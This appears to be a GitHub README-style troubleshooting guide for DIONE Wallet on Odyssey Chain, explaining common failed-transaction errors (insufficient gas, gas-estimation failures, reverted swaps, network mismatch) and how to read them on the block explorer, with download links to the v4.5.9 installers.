![DIONE Wallet](assets/banner-article.png)

# DIONE Wallet Transaction Failed: Read the Error, Then Act

<p align="center">The error text is the answer</p>

<p align="center"><a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.exe"><img src="assets/button-windows.png" alt="Windows"></a> <a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-006971?style=for-the-badge&logo=apple&logoColor=white" alt="macOS"></a> <a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-006971?style=for-the-badge&logo=linux&logoColor=white" alt="Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`dione-wallet-v4.5.9.exe`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-66519E?style=flat-square&logo=apple&logoColor=white&labelColor=1B1B1D" alt="macOS"> | macOS 12 or later | [`dione-wallet-v4.5.9.dmg`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-66519E?style=flat-square&logo=linux&logoColor=white&labelColor=1B1B1D" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`dione-wallet-v4.5.9.zip`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.zip) |

</div>

All versions and checksums are on the [v4.5.9 release page](https://github.com/dione-protocol/dione-desktop-wallet/releases/tag/v4.5.9).

> [!WARNING]
> Only download from this GitHub release page. A mirror, a search advertisement or a file sent in a chat is not the project.

A failed transaction was included in a block and reverted, which means it consumed its fee and moved nothing. The error text names the reason: an insufficient gas balance, a token approval that was never granted, a slippage limit set too tight, or a contract that refused the call. Read it before retrying - a second attempt with the same inputs fails the same way.

## The four failures worth recognising

Most failures in a self-custody wallet fall into a short list, and each has a different fix. None of them is fixed by sending the transaction again unchanged.

| Error reads like | What happened | What to do |
| --- | --- | --- |
| insufficient funds for gas | the account cannot cover the fee in DIONE | receive a small amount of DIONE to the same address, then retry |
| cannot estimate gas | the call would revert if sent | check the amount, the token and the slippage before retrying |
| transaction reverted | the contract refused it | read the reason on the explorer, it is usually the approval or the balance |
| user rejected / signature declined | the signing step was cancelled | re-sign, if the transaction is still what you want |

The second row is the one that confuses people, because the message sounds technical and the cause is usually simple: a swap whose price moved past its slippage limit, a token contract that is not the one the app expected, or an amount larger than the balance after the fee.

## Gas is paid in DIONE, and the fee is not the amount

Every transaction on Odyssey Chain pays a fee in DIONE to the network, computed from gas used multiplied by gas price. The wallet charges nothing on top - it is free to download and free to use - so a failure citing gas is always about the network fee, never about a subscription.

A wallet holding tokens but no native DIONE cannot send anything, including an approval that would let it sell those tokens. That is the most common dead end on this chain: the balance looks funded, and every action still fails. There is also no wallet-imposed minimum send amount - the only constraint on a transfer is that the amount plus the fee fits inside the spendable balance. [Odyssey Chain Gas Fees Inside DIONE Wallet](https://github.com/dione-protocol/setup-and-troubleshooting/blob/main/odyssey-chain-gas-fees-in-dione-wallet.md) explains the fee model and how to judge whether a balance is enough.

## Swaps that say successful and deliver nothing

A swap flow has two transactions in it: an approval, and the swap itself. If the approval confirmed and the swap did not, the wallet shows a completed step and an unchanged balance. If the swap confirmed but the price moved past the slippage limit, it reverts - and a reverted swap costs its fee and delivers nothing.

Two checks resolve the confusion. On the explorer, look at the transaction status rather than the wallet's summary; a reverted swap is plainly marked. Then compare the token you received with the token you expected: a swap that delivered a different contract's token is a token-selection error, not a failure.

[Swap on AmaraSwap Using DIONE Wallet](https://github.com/dione-protocol/keys-and-transfers/blob/main/swap-on-amaraswap-using-dione-wallet.md) covers the approval-then-swap sequence and the slippage setting that most often causes a revert on a thin pair.

## Reading the error on the explorer

The explorer is the authority on what happened. On Odyssey Chain that explorer is OdysseyScan: open it, search the address or the transaction hash, and read the status field before anything else. Open the transaction and read three fields: status, gas used, and the revert reason where one is recorded. A status of failed with gas used near the limit usually means the call ran out of gas mid-execution; a status of failed with low gas used usually means it was rejected early, often by an approval check.

Wallet-side error text can be terser than the chain's own record, so when the two disagree, trust the explorer.

If the wallet reports a failure and the explorer has no record of the transaction at all, nothing reached the chain. That is the pending case rather than the failed one, and it is fixed by a replacement rather than by reading an error.

## What not to retry

- **The same transaction with the same slippage** after a revert from price movement. Raise the tolerance deliberately, or wait for the pair to settle.
- **A larger amount** when the failure cited funds. The balance is the balance.
- **A different token contract** that appeared in a search result rather than in the app's own list. That is how a swap sends value to the wrong asset.

If a transaction failed because an approval is missing, the fix is the approval, not another swap attempt. Approvals are per token and can be revoked later, which is worth knowing before granting an unlimited one.

## When the failure is a network mismatch

A send that fails with an estimate error, on an address that looks correct, is often a network mismatch: the address exists on Odyssey Chain and on Ethereum, and the token you are trying to move lives on the other one. Confirm which chain the asset is on before adjusting anything.

The migration case is the frequent instance - an ERC-20 balance that was never converted is not sendable as native DIONE. [Migrate DIONE From ERC-20 to Odyssey Chain](https://github.com/dione-protocol/keys-and-transfers/blob/main/migrate-dione-from-erc20-to-odyssey.md) covers that route, and [DIONE Wallet Balance Shows Zero: Causes and Fixes](https://github.com/dione-protocol/setup-and-troubleshooting/blob/main/dione-wallet-balance-shows-zero.md) handles the display side of the same confusion.

## Keep the install current

DIONE Wallet is actively maintained, and the current release is published on the releases page.

Error reporting and fee estimation are both improved between builds, and a wallet that is behind can surface a generic failure where the current release names the cause. Install from [the v4.5.9 release](https://github.com/dione-protocol/dione-desktop-wallet/releases/tag/v4.5.9) first, then read the explorer if the message is still unclear.

## FAQ

### Why did my transaction fail with insufficient gas?

The account could not cover the network fee in DIONE. Receive a small amount of DIONE to the same address, then send again - the fee is paid to the network, not to the wallet.

### What does "cannot estimate gas" mean?

The transaction would revert if it were sent, so the wallet refuses to price it. The usual causes are slippage set too tight, an amount above the spendable balance, or the wrong token contract selected.

### Does a failed transaction cost anything?

Yes. It was included in a block, so it consumed its fee while moving nothing. That fee is not refunded by the wallet.

### Why did the swap say successful but my balance is unchanged?

Usually only the approval confirmed, or the swap reverted on slippage and the wallet summarised it as complete. Check the transaction status on the explorer before retrying.

A failure you can name is a failure you can fix, and the explorer names it. If the transaction never landed at all, [Fix a Stuck DIONE Wallet Transaction](https://github.com/dione-protocol/setup-and-troubleshooting/blob/main/fix-a-stuck-dione-wallet-transaction.md) is the closer page; if the fee maths is the puzzle, [Odyssey Chain Gas Fees Inside DIONE Wallet](https://github.com/dione-protocol/setup-and-troubleshooting/blob/main/odyssey-chain-gas-fees-in-dione-wallet.md); and if the wallet will not stay connected long enough to send, [DIONE Wallet Stuck on Connecting](https://github.com/dione-protocol/setup-and-troubleshooting/blob/main/dione-wallet-stuck-on-connecting.md) covers that separately.
